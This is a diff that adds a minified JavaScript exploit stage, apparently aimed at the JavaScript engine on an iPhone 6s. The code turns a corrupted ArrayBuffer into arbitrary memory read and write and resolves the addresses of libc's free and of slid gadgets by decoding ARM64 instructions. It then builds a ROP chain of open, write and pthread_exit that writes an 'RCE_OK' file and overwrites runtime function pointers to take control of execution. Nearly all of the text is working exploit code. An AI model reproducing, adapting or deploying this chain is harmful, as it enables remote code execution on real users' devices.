@@ -1,0 +1,43 @@
+!function(){var n=0x3f4f174n,f=0x557bc20n,r=0x557af30n,t="N1IOS_6S_OK\n",e="START";function i(n){e=n;try{globalThis.N1IOS=n}catch(n){}try{"undefined"!=typeof console&&console&&console.log&&console.log("N1IOS2:"+n)}catch(n){}try{if("undefined"!=typeof document&&document&&document.getElementById){var f=document.getElementById("v");f&&(f.textContent=String(n))}}catch(n){}}function u(){throw new Error("N1IOS "+e)}function a(n){return"0x"+(0xffffffffffffffffn&n).toString(16)}function o(n){return n>0x10000n&&n<0x0001000000000000n&&0n===(7n&n)}function c(n){return n>0x10000n&&n<0x0001000000000000n&&0n===(3n&n)}var x=new Uint8Array(AB);function B(n){return(x[n]|x[n+1]<<8|x[n+2]<<16|x[n+3]<<24)>>>0}function v(n){return x[n]|x[n+1]<<8}function g(n){var f=(x[n]|x[n+1]<<8|x[n+2]<<16|x[n+3]<<24)>>>0,r=(x[n+4]|x[n+5]<<8|x[n+6]<<16|x[n+7]<<24)>>>0;return BigInt(r)<<32n|BigInt(f)}for(var A=-1,N=0;N+72<=8192;N+=8)if(24===v(N+18)&&72===B(N+64)){var I=g(N+24);if(I>0x10000n&&I<0x0001000000000000n&&0n===(7n&I)){A=N;break}}if(A<0)return i("NO_ABV"),u();var b=g(A+56),m=g(A+24);if(!(b>0x10000n&&0n===(7n&b)))return i("BAD_D"),u();if(i("ABV k="+A+" D="+a(b)),x[A+64]=255,x[A+65]=255,x[A+66]=255,x[A+67]=127,2147483647!==ABV.length)return i("LEN_"+ABV.length),u();var l=b;function O(n){for(var f=0;f<8;f++)x[A+56+f]=Number(n>>BigInt(8*f)&0xffn);l=n}function V(n){var f=(ABV[n]|ABV[n+1]<<8|ABV[n+2]<<16|ABV[n+3]<<24)>>>0,r=(ABV[n+4]|ABV[n+5]<<8|ABV[n+6]<<16|ABV[n+7]<<24)>>>0;return BigInt(r)<<32n|BigInt(f)}function _(n){var f=n-l;return f>=0n&&f<0x70000000n?V(Number(f)):(O(n),V(0))}function h(n,f){var r=n-l;r>=0n&&r<0x70000000n||(O(n),r=0n);for(var t=Number(r),e=0;e<8;e++)ABV[t+e]=Number(f>>BigInt(8*e)&0xffn)}function y(n){var f=_(-8n&n),r=8*Number(7n&n);return Number(f>>BigInt(r)&0xffffffffn)>>>0}var d=function(n){var f=_(n-8n),r=Number(0xffffn&f);if(8n!==(f>>16n&0xffn)||r>=64)return 0n;var t=n-16n-80n*BigInt(r),e=_(t),i=Number(0xffn&e),u=Number(e>>32n&0xffffn);if(8!==i||u<10||u>63||r>=u)return 0n;var a,x,B,v,g,A,N,I=t-32n+16n,b=I,m=0n;for(a=0;a<4096;a++){if(!o(x=0x00ffffffffffffffn&_(b)))return 0n;if(N=!1,o(B=x-16n)&&(v=_(B+32n),g=Number(0xffn&v),A=Number(v>>32n&0xffffn),8===g&&A>=10&&A<=63&&(N=!0)),!N){m=x;break}if(x===I){m=b;break}b=x}if(0n===m)return 0n;var l,O=m-0x48n-128n&0x00ffffffffffffffn;return(l=O)>0x10000n&&0n===(0x0fn&l)&&l<0x0001000000000000n&&c(_(l+16n))&&c(_(l+24n))&&c(_(l+32n))?O:0n}(b);if(i("RT1="+a(d)),0n===d&&i("RT2="+a(d=function(){var n=_(m+48n);if(!o(n))return 0n;var f=_(n+32n);if(!o(f))return 0n;for(var r=0;r<24;r++){var t=_(f+BigInt(16*r));if(0xffffffffffffffffn===_(f+BigInt(16*r+8))&&o(t)&&12==(y(t+16n)>>>16&65535)){var e=_(t+48n);if(!o(e))continue;var i=_(e+16n);if(o(i)&&c(_(i+16n)))return i}}return 0n}())),0n===d)return i("NO_RT D="+a(b)),u();var S=_(d+16n);if(!c(S))return i("NO_FREE "+a(S)),u();var E=_(d+64n),T=0n;if(n){var PP=S-BigInt(n)&0x00ffffffffffffffn;if(0n===(PP&0xfffn)&&4277009103===y(PP))T=PP;}if(0n===T)return i("NO_BASE js_free="+a(S)),u();
+/* ===== iOS 6s base/libcFree/gadgets ===== */
+
+var libcFree=0n;
+if(y(S)===0xaa0103e0){var br=y(S+4n);if(((br&0xfc000000)>>>0)===0x14000000){var im=br&0x03ffffff;if(im&0x02000000)im-=0x04000000;var plt=S+4n+BigInt(im)*4n;var ad=y(plt);if(((ad&0x9f000000)>>>0)===0x90000000){var ml=(ad>>>29)&3,mh=(ad>>>5)&0x7ffff;var ai=(mh<<2)|ml;if(ai&0x100000)ai-=0x200000;var pg=(plt&~0xfffn)+BigInt(ai)*4096n;var ld=y(plt+4n);if(((ld&0xffc00000)>>>0)===0xf9400000){var g2=_(pg+BigInt((ld>>>10)&0xfff)*8n);if(c(g2))libcFree=g2;}}}}
+if(0n===libcFree){i("U_NO_FREE");return;}
+var OPEN=libcFree+0xB79B52BCn,WRITE=libcFree+0xB79B3B8Cn,PEXIT=libcFree-0x88ACn;
+var G_CALL=T+0x3292cn,G_LOAD=T+0x172d96cn,G_X0=T+0x628a2cn,PIVOT2=libcFree+0xB6583074n;
+
+
+function u64(x){return BigInt.asUintN(64,x);}
+function put64_(arr,off,val){var v=u64(val);for(var i=0;i<8;i++)arr[off+i]=Number((v>>BigInt(i*8))&0xffn);}
+/* ===== iOS 6s ROP: UB leak + TRIG chain + open/write/pthread_exit ===== */
+var HOSTCFG=0; /* set 1 in the host variant */
+var MAG=0x1122334455667788n;
+var UB=globalThis.UB;if(!UB){UB=new Uint8Array(2048);for(var i0=0;i0<2048;i0++)UB[i0]=0;put64_(UB,0x400,MAG);}
+var U=0n,lim=0x10000n,off;
+for(off=b;off<b+lim;off+=8n){var w=_ (off);if((w&0xffffffffn)===2048n){var p=_(off+16n);var pq=p&0x00ffffffffffffffn;if(pq>0x10000n&&pq<0x0001000000000000n&&0n===(7n&p)){try{if(_(p+0x400n)===MAG){U=p;break;}}catch(e){}}}}
+if(U===0n){for(off=b-8n;off>b-lim;off-=8n){var w2=_(off);if((w2&0xffffffffn)===2048n){var p2=_(off+16n);var pq2=p2&0x00ffffffffffffffn;if(pq2>0x10000n&&pq2<0x0001000000000000n&&0n===(7n&p2)){try{if(_(p2+0x400n)===MAG){U=p2;break;}}catch(e){}}}}}
+if(U===0n){i("U_NF D="+a(b));return;}
+var PATH='/private/var/mobile/Containers/Shared/AppGroup/00000000-0000-0000-0000-000000000000/rce.txt';
+var MSG='RCE_OK\n';
+function a8(x){return(x+7)&~7;}
+var oPath=0,oMsg=a8(oPath+PATH.length+1),oA0=a8(oMsg+MSG.length+1),oB0=oA0+0x40,oA1=oB0+0x40,oB1=oA1+0x40,oEnd=oB1+0x40;
+for(var z=0;z<oEnd;z++)UB[z]=0;
+for(var z2=0;z2<PATH.length;z2++)UB[oPath+z2]=PATH.charCodeAt(z2)&0xff;
+for(var z3=0;z3<MSG.length;z3++)UB[oMsg+z3]=MSG.charCodeAt(z3)&0xff;
+UB[oA0+0x10]=0x01;UB[oA0+0x11]=0x06;UB[oA0+0x18]=0xa4;UB[oA0+0x19]=0x01;
+put64_(UB,oB0+0x28,U+BigInt(oPath));put64_(UB,oA1+0x10,U+BigInt(oMsg));UB[oA1+0x18]=MSG.length;
+var TRIG=new Uint8Array(0x400);for(var i1=0;i1<0x400;i1++)TRIG[i1]=0;
+put64_(TRIG,0x08,U+BigInt(oB0));put64_(TRIG,0x10,G_LOAD);put64_(TRIG,0x18,U+BigInt(oA0));
+put64_(TRIG,0xB8,U+BigInt(oB0));put64_(TRIG,0xD0,OPEN);put64_(TRIG,0xE0,G_X0);
+put64_(TRIG,0xF0,G_LOAD);put64_(TRIG,0xF8,U+BigInt(oA1));put64_(TRIG,0x110,G_CALL);
+put64_(TRIG,0x1A0,WRITE);put64_(TRIG,0x1C0,G_CALL);put64_(TRIG,0x248,U+BigInt(oB1));
+put64_(TRIG,0x260,PEXIT);put64_(TRIG,0x270,G_X0);
+i("U_RDY "+a(U)+" PATH="+PATH);
+if(HOSTCFG){return;}
+var RT_FREE=d+16n,RT_USABLE=d+32n,RT_SIZE=d+48n,RT_OPAQUE=d+64n;
+var HUGE=0xffffffffffffffffn,ZERO=0n;
+h(RT_FREE,G_CALL);h(RT_OPAQUE,ZERO);h(RT_USABLE,PIVOT2);h(RT_SIZE,HUGE);
+TRIG=null;
+i("U_AFTER");
+u()}();
